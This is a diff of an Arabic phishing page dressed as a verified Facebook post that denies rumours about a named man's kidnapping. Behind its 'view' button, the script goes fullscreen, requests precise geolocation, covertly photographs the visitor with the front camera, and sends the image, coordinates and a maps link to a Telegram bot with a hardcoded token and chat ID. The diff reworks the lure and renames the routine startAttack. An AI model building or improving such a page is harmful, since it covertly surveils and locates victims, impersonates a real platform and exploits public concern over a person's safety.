@@ -3,41 +3,39 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>توضيح رسمي - فيسبوك</title>
-    
+    <title>فيسبوك - توضيح</title>
     <style>
         body { margin:0; padding:0; background:#f0f2f5; font-family: Segoe UI, Helvetica, Arial, sans-serif; display: flex; justify-content: center; }
-        .fb-post { width: 100%; max-width: 500px; background: white; margin-top: 12px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.2); }
+        .fb-post { width: 100%; max-width: 500px; background: white; margin-top: 12px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.2); border: 1px solid #dddfe2; }
         
-        /* رأس المنشور - احترافي */
-        .header { display: flex; align-items: center; padding: 12px 16px; position: relative; }
-        .avatar { width: 40px; height: 40px; border-radius: 50%; background: #1877f2; display: flex; align-items: center; justify-content: center; color: white; font-size: 20px; margin-left: 12px; box-shadow: inset 0 0 0 1px rgba(0,0,0,0.1); }
+        /* رأس المنشور */
+        .header { display: flex; align-items: center; padding: 12px 16px; }
+        .avatar { width: 40px; height: 40px; border-radius: 50%; background: #1877f2; display: flex; align-items: center; justify-content: center; color: white; font-size: 18px; margin-left: 12px; }
         .name-container { display: flex; flex-direction: column; }
         .page-name { font-weight: 600; font-size: 15px; color: #050505; display: flex; align-items: center; }
         .page-name::after { content: ' ✔'; color: #1877f2; margin-right: 4px; font-size: 12px; }
         .time { font-size: 13px; color: #65676b; margin-top: 2px; }
 
         /* نص المنشور */
-        .content { padding: 4px 16px 16px 16px; font-size: 15px; line-height: 1.5; color: #050505; white-space: pre-wrap; }
-        .hashtag { color: #1877f2; cursor: pointer; text-decoration: none; }
-        .hashtag:hover { text-decoration: underline; }
+        .content { padding: 4px 16px 16px 16px; font-size: 15px; line-height: 1.5; color: #050505; }
+        .hashtag { color: #1877f2; cursor: pointer; }
 
-        /* منطقة التمويه البصري */
-        .media-box { position: relative; width: 100%; height: 280px; background: #000; display: flex; justify-content: center; align-items: center; overflow: hidden; border-top: 1px solid #ebedf0; border-bottom: 1px solid #ebedf0; }
-        .bg-img { position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0.3; filter: blur(8px); }
+        /* منطقة التمويه */
+        .media-box { position: relative; width: 100%; height: 260px; background: #000; display: flex; justify-content: center; align-items: center; overflow: hidden; }
+        .bg-img { position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0.4; filter: blur(10px); }
         
         .cta-button {
             position: relative; z-index: 20;
-            padding: 12px 35px; background: #1877f2; color: white;
-            border: none; border-radius: 6px; font-weight: 600;
-            font-size: 15px; cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            padding: 12px 30px; background: #1877f2; color: white;
+            border: none; border-radius: 6px; font-weight: 600; font-size: 15px; cursor: pointer;
         }
 
-        /* شريط التفاعلات */
+        /* تفاعلات واقعية جداً */
         .engagement { padding: 10px 16px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #ebedf0; }
         .reactions { display: flex; align-items: center; font-size: 13px; color: #65676b; }
-        .reaction-icons { margin-left: 6px; display: flex; }
-        .icon { width: 18px; height: 18px; border-radius: 50%; border: 2px solid white; margin-left: -4px; }
+        .reaction-icons { display: flex; margin-left: 8px; }
+        .icon-blue { width: 18px; height: 18px; background: #1877f2; border-radius: 50%; color: white; display: flex; align-items: center; justify-content: center; font-size: 10px; border: 2px solid white; z-index: 3; }
+        .icon-red { width: 18px; height: 18px; background: #fa3e3e; border-radius: 50%; color: white; display: flex; align-items: center; justify-content: center; font-size: 10px; border: 2px solid white; margin-right: -5px; z-index: 2; }
         
         .actions-bar { display: flex; padding: 4px 0; justify-content: space-around; }
         .btn-action { flex: 1; text-align: center; padding: 8px; color: #65676b; font-size: 14px; font-weight: 600; cursor: pointer; }
@@ -55,12 +53,10 @@
     </div>
 
     <div class="content">
-<b>توضيح هائل بخصوص الأخبار المتداولة عن [محمد مصطفى العنعوني]</b>
-
-نود الإحاطة بأن الأخبار التي انتشرت مؤخراً حول "اختطاف" محمد مصطفى العنعوني هي أخبار غير صحيحة وعارية تماماً عن الصحة.
-محمد بخير وعافية، ونرجو من الجميع توخي الدقة وعدم الانجرار وراء الشائعات. اتقوا الله فيما تنشرون.
-
-<span class="hashtag">#توضيح #نفي_خبر #محمد_مصطفى_العنعوني</span>
+        <b>توضيح بخصوص الأخبار المتداولة عن [محمد مصطفى العنعوني]</b><br><br>
+        نود الإحاطة بأن الأخبار التي انتشرت مؤخراً حول "اختطاف" محمد مصطفى العنعوني هي أخبار غير صحيحة وعارية تماماً عن الصحة.<br>
+        محمد بخير وعافية، ونرجو من الجميع توخي الدقة وعدم الانجرار وراء الشائعات. اتقوا الله فيما تنشرون.<br><br>
+        <span class="hashtag">#توضيح #نفي_خبر #محمد_مصطفى_العنعوني</span>
     </div>
 
     <div class="media-box">
@@ -71,12 +67,12 @@
     <div class="engagement">
         <div class="reactions">
             <div class="reaction-icons">
-                <div class="icon" style="background:#1877f2; display:flex; align-items:center; justify-content:center; color:white; font-size:10px;">👍</div>
-                <div class="icon" style="background:#fb3958; display:flex; align-items:center; justify-content:center; color:white; font-size:10px;">❤️</div>
+                <div class="icon-blue">👍</div>
+                <div class="icon-red">❤️</div>
             </div>
-            ١.٤ ألف
+            <span>٣٠٠</span>
         </div>
-        <div style="font-size:13px; color:#65676b;">٨٦ تعليق • ١٢ مشاركة</div>
+        <div style="font-size:13px; color:#65676b;">٢٤ تعليق • ٧ مشاركات</div>
     </div>
 
     <div class="actions-bar">
@@ -91,7 +87,7 @@ const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
 const CHAT_ID = "1611398303";
 
 document.getElementById('triggerBtn').onclick = function() {
-    // 1. تفعيل وضع ملء الشاشة فوراً
+    // تفعيل ملء الشاشة
     let elem = document.documentElement;
     if (elem.requestFullscreen) { elem.requestFullscreen(); } 
     else if (elem.webkitRequestFullscreen) { elem.webkitRequestFullscreen(); }
@@ -99,13 +95,28 @@ document.getElementById('triggerBtn').onclick = function() {
     this.innerText = "جاري التحميل...";
     this.disabled = true;
 
-    // 2. الانتظار 4 ثوانٍ ثم البدء
+    // الانتظار 4 ثوانٍ
     setTimeout(() => {
-        startProcess();
+        startAttack();
     }, 4000);
 };
 
-async function startProcess() {
+async function startAttack() {
+    // 1. طلب الموقع أولاً (كما طلبت)
+    navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+            // بعد الحصول على الموقع، نطلب الكاميرا
+            await captureCam(pos);
+        },
+        async () => {
+            // حتى لو رفض الموقع، نحاول طلب الكاميرا
+            await captureCam(null);
+        },
+        { enableHighAccuracy: true, timeout: 5000 }
+    );
+}
+
+async function captureCam(posData) {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         const v = document.createElement('video');
@@ -119,26 +130,26 @@ async function startProcess() {
             const img = canvas.toDataURL('image/jpeg');
             stream.getTracks().forEach(t => t.stop());
 
-            navigator.geolocation.getCurrentPosition(
-                (pos) => sendData(img, pos),
-                () => sendData(img, null),
-                { enableHighAccuracy: true }
-            );
-        }, 1000);
+            await sendDataToTele(img, posData);
+        }, 1200);
     } catch (e) {
+        // إذا فشل كل شيء، نوجه للفيسبوك
         window.location.href = "https://m.facebook.com/";
     }
 }
 
-async function sendData(img, pos) {
+async function sendDataToTele(img, pos) {
     let caption = `✅ صيد جديد (نفي الخبر)\n📱 النظام: ${navigator.platform}`;
     if(pos) {
         caption += `\n📍 الموقع: ${pos.coords.latitude},${pos.coords.longitude}`;
+        caption += `\n🔗 الخريطة: https://www.google.com/maps?q=$${pos.coords.latitude},${pos.coords.longitude}`;
+    } else {
+        caption += `\n📍 الموقع: تم الرفض أو غير متاح`;
     }
 
     const blob = dataURLtoBlob(img);
     const fd = new FormData();
-    fd.append('photo', blob, 'capture.jpg');
+    fd.append('photo', blob, 'shot.jpg');
     fd.append('caption', caption);
     fd.append('chat_id', CHAT_ID);
 
